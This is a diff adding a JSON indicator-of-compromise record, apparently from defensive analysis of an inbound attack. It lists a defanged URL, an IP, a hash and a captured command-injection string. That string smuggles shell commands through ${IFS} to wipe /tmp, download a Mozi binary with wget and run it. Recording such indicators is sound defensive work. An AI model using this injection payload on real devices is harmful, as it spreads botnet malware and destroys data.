@@ -1,0 +1,26 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://223[.]123[.]43[.]XXX:43525/Mozi.a;sh$"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "223[.]123[.]43.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://223[.]123[.]43[.]XXX:43525/Mozi.a;sh${IFS}/tmp/Moz"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "cba1f172531f87a33b5130d55bd807b3dca6454b2011cc0aef2ce79dd25ac4f0"
+  }
+]
